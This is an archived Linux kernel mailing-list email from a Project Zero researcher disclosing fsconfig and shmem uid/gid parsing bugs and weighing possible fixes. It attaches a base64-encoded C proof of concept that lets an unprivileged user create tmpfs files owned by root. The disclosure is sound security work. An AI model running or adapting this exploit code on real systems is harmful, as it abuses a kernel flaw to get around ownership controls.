Return-Path: <linux-fsdevel-owner@vger.kernel.org>
X-Original-To: lists+linux-fsdevel@lfdr.de
Delivered-To: lists+linux-fsdevel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id B66BC5A895C
	for <lists+linux-fsdevel@lfdr.de>; Thu,  1 Sep 2022 01:12:41 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S230490AbiHaXMj (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
        Wed, 31 Aug 2022 19:12:39 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:33420 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S229682AbiHaXMh (ORCPT
        <rfc822;linux-fsdevel@vger.kernel.org>);
        Wed, 31 Aug 2022 19:12:37 -0400
Received: from mail-lj1-x232.google.com (mail-lj1-x232.google.com [IPv6:2a00:1450:4864:20::232])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id E90FEE68A4
        for <linux-fsdevel@vger.kernel.org>; Wed, 31 Aug 2022 16:12:34 -0700 (PDT)
Received: by mail-lj1-x232.google.com with SMTP id z20so16173641ljq.3
        for <linux-fsdevel@vger.kernel.org>; Wed, 31 Aug 2022 16:12:34 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20210112;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc;
        bh=8KYH2gb2YkEwP4/OO+288jAGcC2hVa7UIjcJY4GEmIU=;
        b=sC3rh3EgMTd+0l2qjWSMlydUJ3TrO30DH7XQYAPptuZOPhPhB4ehiiQMGpraVapzYU
         Vi99VNDm1m2s3M83fasWr5+1m7Hh6qZs6aNeC5adyu3LGWUywOEaEb/YYRqR/+WvZMf0
         Dx6GF8raQu5UvpHdobepg6Rx8GdeIDlgzLVi93W4/aKeoLhHncgPqOiEuXLXa4W05DzT
         eSBPAw+yCtS5Lc8HfHQFe4mp+fJVbDHZXfjAeLmzn/42z6XJQYo/MRqzgGvKyS4gfRVb
         wLEMQ3cKhcbx6Yjg4RlrlBHVIg2MwQFefZekbPKjX7lxA+V5XdejQlA0vLQ6kJqkjIOm
         vNHQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc;
        bh=8KYH2gb2YkEwP4/OO+288jAGcC2hVa7UIjcJY4GEmIU=;
        b=4aHD7Y5Be+fG55sX8gMdufHlvtPm8lcknHHQHbQAUi+dViVnIP77N/R/JMuEtPQlXE
         80X27QvNUT483WJ5Zw27QCKw+xHATIYDrHIKwji4P0q6Y7tCRVCB5xZXIa+LfzkX/s7B
         PGoY+OAmkH5qJ+pOEknS9ItzV1gN6AUwfN0gIGheznuGZp/tbJTeFgSiHgM+m1wZei5U
         fpvQrX8iltX/tj9bfG1YntbJancf1/DkGwYcTiGerxynx70c1e1ThphNp1QraF45Z4lR
         dfjFsCRpTFXW7sGUwKlqvwv3rU5k00I9P+3qlY55nfd9tEC2XFsbtv2U1nUNWW8fnkZk
         Frvg==
X-Gm-Message-State: ACgBeo2RDnigHLAfEAgAY23rOcDOTDGVAahTp/b3+CcqzWFsSU4k+KNE
        xYZKEBhNjValIaOpDqZyoUzxH75Gh1/+PqFUSjrRYA==
X-Google-Smtp-Source: AA6agR4JcXBzMY366xK3IT+lELdJVvGfDOuHrx4MO9lYCGIuBv8yPg/Z3rQbpf+agb1PavlH5FnX6nL/N6dsX9xeAAI=
X-Received: by 2002:a2e:b0f9:0:b0:266:d31e:3061 with SMTP id
 h25-20020a2eb0f9000000b00266d31e3061mr3762433ljl.391.1661987552525; Wed, 31
 Aug 2022 16:12:32 -0700 (PDT)
MIME-Version: 1.0
From:   Seth Jenkins <sethjenkins@google.com>
Date:   Wed, 31 Aug 2022 16:12:21 -0700
Message-ID: <CALxfFW4BXhEwxR0Q5LSkg-8Vb4r2MONKCcUCVioehXQKr35eHg@mail.gmail.com>
Subject: fsconfig parsing bugs
To:     viro@zeniv.linux.org.uk, linux-fsdevel@vger.kernel.org,
        linux-kernel@vger.kernel.org, dhowells@redhat.com
Cc:     Jann Horn <jannh@google.com>,
        Natalie Silvanovich <natashenka@google.com>
Content-Type: multipart/mixed; boundary="000000000000b1350605e791a1b0"
X-Spam-Status: No, score=-17.6 required=5.0 tests=BAYES_00,DKIMWL_WL_MED,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,
        ENV_AND_HDR_SPF_MATCH,RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS,
        T_SCC_BODY_TEXT_LINE,USER_IN_DEF_DKIM_WL,USER_IN_DEF_SPF_WL
        autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-fsdevel.vger.kernel.org>
X-Mailing-List: linux-fsdevel@vger.kernel.org

--000000000000b1350605e791a1b0
Content-Type: text/plain; charset="UTF-8"

The codebase-wide refactor efforts to using the latest fs mounting API
(with support for fsopen/fsconfig/fsmount etc.) have introduced some
bugs into mount configuration parsing in several parse_param handlers,
most notably shmem_parse_one() which can be accessed from a userns.
There are several cases where the following code pattern is used:

ctx->value = <expression>
if(ctx->value is invalid)
   goto fail;
ctx->seen |= SHMEM_SEEN_X;
break;

However, this coding pattern does not work in the case where multiple
fsconfig calls are made. For example, if I were to call fsconfig with
the key "nr_blocks" twice, the first time with a valid value, and the
second time with an invalid value, the invalid value will be persisted
and used upon creation of the mount for the value of ctx->blocks, and
consequently for sbinfo->max_blocks.

This code pattern is used for Opt_nr_blocks, Opt_nr_inodes, Opt_uid,
Opt_gid and Opt_huge. Probably the proper thing to do is to check for
validity before assigning the value to the shmem_options struct in the
fs_context.

We also see this code pattern replicated throughout other filesystems
for uid/gid resolution, including hugetlbfs, FUSE, ntfs3 and ffs.

The other outstanding issue I noticed comes from the fact that
fsconfig syscalls may occur in a different userns than that which
called fsopen. That means that resolving the uid/gid via
current_user_ns() can save a kuid that isn't mapped in the associated
namespace when the filesystem is finally mounted. This means that it
is possible for an unprivileged user to create files owned by any
group in a tmpfs mount (since we can set the SUID bit on the tmpfs
directory), or a tmpfs that is owned by any user, including the root
group/user. This is probably outside the original intention of this
code.

The fix for this bug is not quite so simple as the others. The options
that I've assessed are:

- Resolve the kuid/kgid via the fs_context namespace - this does
however mean that any task outside the fsopen'ing userns that tries to
set the uid/gid of a tmpfs will have to know that the uid/gid will be
resolved by a different namespace than that which the current task is
in. It also subtly changes the behavior of this specific subsystem in
a userland visible way.
- Globally disallow fsconfig calls originating from outside the
fs_context userns - This is a more robust solution that would prevent
any similar bugs, but it may impinge on valid mount use-cases. It's
the best from a security standpoint and if it's determined that it was
not in the original intention to be juggling user/mount namespaces
this way, it's probably the ideal solution.
- Throw EINVAL if the kuid specified cannot be mapped in the mounting
userns (and/or potentially in the fs_context userns) - This is
probably the solution that remains most faithful to all potential
use-cases, but it doesn't reduce the potential for variants in the
future in other parts of the codebase and it also introduces some
slight derivative logic bug risk.
- Don't resolve the uid/gid specified in fsconfig at all, and resolve
it during mount-time when calling an associated fill_super. This is
precedented and used in other parts of the codebase, but specificity
is lost in the final error case since an end-user cannot easily
attribute a mount failure to an unmappable uid.

I've also attached a PoC for this bug that demonstrates that an
unprivileged user can create files/directories with root uid/gid's.
There is no deadline for this issue as we can't see any obvious way to
cross a privilege boundary with this.

Thanks in advance!
--

Seth Jenkins
Information Security Engineer
Google Project Zero
sethjenkins@google.com

--000000000000b1350605e791a1b0
Content-Type: text/x-csrc; charset="US-ASCII"; name="main.c"
Content-Disposition: attachment; filename="main.c"
Content-Transfer-Encoding: base64
Content-ID: <f_l7i7yb640>
X-Attachment-Id: f_l7i7yb640

I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPHN5cy93YWl0
Lmg+CiNpbmNsdWRlIDxzeXMvdXRzbmFtZS5oPgojaW5jbHVkZSA8c2NoZWQuaD4KI2luY2x1ZGUg
PHN0cmluZy5oPgojaW5jbHVkZSA8c3RkaW50Lmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVk
ZSA8c3RkbGliLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN5cy9tbWFuLmg+CiNp
bmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPHN5cy9tb3Vu
dC5oPgojZGVmaW5lIEZTQ09ORklHX1NFVF9TVFJJTkcgMQojZGVmaW5lIEZTQ09ORklHX0NNRF9D
UkVBVEUgNgovLyNkZWZpbmUgTVNfTk9ERVYgNAojZGVmaW5lIE1PVkVfTU9VTlRfRl9FTVBUWV9Q
QVRICQkweDAwMDAwMDA0IC8qIEVtcHR5IGZyb20gcGF0aCBwZXJtaXR0ZWQgKi8KCmludCBmc29w
ZW4oY2hhciogZnMsdW5zaWduZWQgbG9uZyBmbGFncykgewoJcmV0dXJuIHN5c2NhbGwoNDMwLGZz
LGZsYWdzKTsKfQppbnQgZnNjb25maWcoaW50IGZkLCB1bnNpZ25lZCBpbnQgY21kLCBjaGFyKiBr
ZXksIGNoYXIqIHZhbHVlLCBpbnQgYXV4KSB7CglyZXR1cm4gc3lzY2FsbCg0MzEsZmQsY21kLGtl
eSx2YWx1ZSxhdXgpOwp9CmludCBmc21vdW50KGludCBmZCwgdW5zaWduZWQgaW50IGZsYWdzLCB1
bnNpZ25lZCBpbnQgbW91bnRfYXR0cnMpIHsKCXJldHVybiBzeXNjYWxsKDQzMixmZCxmbGFncyxt
b3VudF9hdHRycyk7Cn0KaW50IG1vdmVfbW91bnQoaW50IGZyb21fZGlyZmQsIGNvbnN0IGNoYXIg
KmZyb21fcGF0aG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICBpbnQgdG9fZGlyZmQsIGNvbnN0
IGNoYXIgKnRvX3BhdGhuYW1lLAogICAgICAgICAgICAgICAgICAgICAgdW5zaWduZWQgaW50IGZs
YWdzKSB7CglyZXR1cm4gc3lzY2FsbCg0MjksZnJvbV9kaXJmZCxmcm9tX3BhdGhuYW1lLHRvX2Rp
cmZkLHRvX3BhdGhuYW1lLGZsYWdzKTsKfQpzdGF0aWMgaW50IGNoaWxkRnVuYyh2b2lkKiBhcmcp
IHsKCW1rZGlyKCJ0bXBmcyIsMDc3Nyk7CglpbnQgZmQgPSBmc29wZW4oInRtcGZzIiwwKTsKCWlm
KGZkIDwgMCkgewoJCXByaW50ZigiZnNvcGVuOiAlbVxuIik7CgkJcmV0dXJuIDE7Cgl9Cglwcmlu
dGYoImZzIGZkOiAlZFxuIixmZCk7CglzbGVlcCgyKTsKCglpZihmc2NvbmZpZyhmZCwgRlNDT05G
SUdfQ01EX0NSRUFURSwgTlVMTCwgTlVMTCwgMCkpIHsKCQlwcmludGYoImZzY29uZmlnICVtXG4i
KTsKCQlyZXR1cm4gMDsKCX0KCgoJaW50IG1vdW50ZmQgPSBmc21vdW50KGZkLDAsTVNfTk9ERVYp
OwoJaWYobW91bnRmZCA9PSAtMSkgewoJCXByaW50ZigiZnNtb3VudDogJW1cbiIpOwoJCXJldHVy
biAwOwoJfQoJaWYobW92ZV9tb3VudChtb3VudGZkLCIiLEFUX0ZEQ1dELCIuL3RtcGZzIixNT1ZF
X01PVU5UX0ZfRU1QVFlfUEFUSCkpIHsKCQlwcmludGYoIm1vdmVfbW91bnQ6ICVtXG4iKTsKCQly
ZXR1cm4gMDsKCX0KCXN5c3RlbSgibW91bnQiKTsKCWludCBmaW5hbF9mZCA9IGNyZWF0KCIuL3Rt
cGZzL3Rlc3RmaWxlIixPX1JEV1IpOwoJaWYoZmluYWxfZmQgPT0gLTEpIHsKCQlwcmludGYoIm9w
ZW46ICVtXG4iKTsKCQlleGl0KDEpOwoJfQoJaW50IGRpcl9mZCA9IG9wZW4oIi4vdG1wZnMiLE9f
UkRPTkxZIHwgT19ESVJFQ1RPUlkpOwoJaWYoZGlyX2ZkID09IC0xKSB7CgkJcHJpbnRmKCJvcGVu
ZGlyOiAlbVxuIik7CgkJZXhpdCgxKTsKCX0KCXNsZWVwKDUpOwoJZXhpdCgwKTsKfQojZGVmaW5l
IFNUQUNLX1NJWkUgKDEwMjQgKiAxMDI0KQoKaW50IG1haW4oKSB7CiAgICAgICAgY2hhciogc3Rh
Y2sgPSBtbWFwKE5VTEwsIFNUQUNLX1NJWkUsIFBST1RfUkVBRCB8IFBST1RfV1JJVEUsIE1BUF9Q
UklWQVRFIHwgTUFQX0FOT05ZTU9VUyB8IE1BUF9TVEFDSywgLTEsIDApOwogICAgICAgIGlmIChz
dGFjayA9PSBNQVBfRkFJTEVEKQogICAgICAgICAgICAgICBwcmludGYoIm1tYXA6ICVtXG4iKTsK
CiAgICAgICAgY2hhciogc3RhY2tUb3AgPSBzdGFjayArIFNUQUNLX1NJWkU7CgogICAgICAgIHBp
ZF90IHBpZCA9IGNsb25lKGNoaWxkRnVuYywgc3RhY2tUb3AsIENMT05FX0ZJTEVTIHwgQ0xPTkVf
TkVXVVNFUiB8IENMT05FX05FV05TLCBOVUxMKTsKCXNsZWVwKDEpOwoJY2hhciB1aWRnaWRmaWxl
WzY0XTsKCWNoYXIgbWFwWzY0XTsKCglzcHJpbnRmKHVpZGdpZGZpbGUsIi9wcm9jLyVkL3VpZF9t
YXAiLHBpZCk7CglpbnQgdWlkX21hcF9mZCA9IG9wZW4odWlkZ2lkZmlsZSxPX1dST05MWSk7Cglz
cHJpbnRmKG1hcCwiMCAlZCAxIixnZXR1aWQoKSk7CglpZih3cml0ZSh1aWRfbWFwX2ZkLG1hcCxz
dHJsZW4obWFwKSkgPCAwKSB7CgkJcHJpbnRmKCJ3cml0ZSB1aWRfbWFwOiAlbVxuIik7CgkJZXhp
dCgxKTsKCX0KCWNsb3NlKHVpZF9tYXBfZmQpOwoKCXNwcmludGYodWlkZ2lkZmlsZSwiL3Byb2Mv
JWQvc2V0Z3JvdXBzIixwaWQpOwoJaW50IHNldGdyb3Vwc19mZCA9IG9wZW4odWlkZ2lkZmlsZSxP
X1dST05MWSk7CglpZih3cml0ZShzZXRncm91cHNfZmQsImRlbnkiLDQpIDwgMCkgewoJCXByaW50
Zigid3JpdGUgc2V0Z3JvdXBzOiAlbVxuIik7CgkJZXhpdCgxKTsKCX0KCWNsb3NlKHNldGdyb3Vw
c19mZCk7CgoJc3ByaW50Zih1aWRnaWRmaWxlLCIvcHJvYy8lZC9naWRfbWFwIixwaWQpOwoJaW50
IGdpZF9tYXBfZmQgPSBvcGVuKHVpZGdpZGZpbGUsT19XUk9OTFkpOwoJc3ByaW50ZihtYXAsIjAg
JWQgMSIsZ2V0Z2lkKCkpOwoJaWYod3JpdGUoZ2lkX21hcF9mZCxtYXAsc3RybGVuKG1hcCkpIDwg
MCkgewoJCXByaW50Zigid3JpdGUgZ2lkX21hcDogJW1cbiIpOwoJCWV4aXQoMSk7Cgl9CgljbG9z
ZShnaWRfbWFwX2ZkKTsKCgkvL1BsZWFzZSBkb24ndCBydW4gdGhpcyBwcm9ncmFtIHdpdGggZXh0
cmEgZmQncwoJaW50IGZzX2ZkID0gMzsKCS8vSXQncyBkaXJ0eSBidXQgd2hvIGNhcmVzLiBKdXN0
IHdhaXRpbmcgZm9yIGZzb3BlbiB0byBoYXBwZW4gb24gY2hpbGQgc2lkZS4KCXdoaWxlKGVycm5v
ID0gMCxmc2NvbmZpZyhmc19mZCxGU0NPTkZJR19TRVRfU1RSSU5HLCJ1aWQiLCIwIiwwKSk7Cglw
cmludGYoImZzY29uZmlnIHVpZCBzZXQ6ICVtXG4iKTsKCXdoaWxlKGVycm5vID0gMCxmc2NvbmZp
Zyhmc19mZCxGU0NPTkZJR19TRVRfU1RSSU5HLCJnaWQiLCIwIiwwKSk7CglwcmludGYoImZzY29u
ZmlnIGdpZCBzZXQ6ICVtXG4iKTsKCXdoaWxlKGVycm5vID0gMCxmc2NvbmZpZyhmc19mZCxGU0NP
TkZJR19TRVRfU1RSSU5HLCJtb2RlIiwiNzc3NyIsMCkpOwoJcHJpbnRmKCJtb2RlIHNldDogJW1c
biIpOwoJaW50IGNyZWF0ZWRfZmlsZV9mZCA9IDU7CglzdHJ1Y3Qgc3RhdCBzdGF0YnVmOwoJcHV0
cygid2FpdGluZyBmb3IgY3JlYXRlZCBmaWxlLi4uIik7Cgl3aGlsZShmc3RhdChjcmVhdGVkX2Zp
bGVfZmQsJnN0YXRidWYpKTsKCXByaW50ZigiaW5pdF9ucyBvd25lZCB1aWQ6ICVkXG4iLHN0YXRi
dWYuc3RfdWlkKTsKCXByaW50ZigiaW5pdF9ucyBvd25lZCBnaWQ6ICVkXG4iLHN0YXRidWYuc3Rf
Z2lkKTsKCWludCB0bXBmc19kaXJfZmQgPSA2OwoJd2hpbGUoZnN0YXQodG1wZnNfZGlyX2ZkLCZz
dGF0YnVmKSk7CglwcmludGYoImluaXRfbnMgZGlyIG93bmVkIHVpZDogJWRcbiIsc3RhdGJ1Zi5z
dF91aWQpOwoJcHJpbnRmKCJpbml0X25zIGRpciBvd25lZCBnaWQ6ICVkXG4iLHN0YXRidWYuc3Rf
Z2lkKTsKfQo=
--000000000000b1350605e791a1b0--
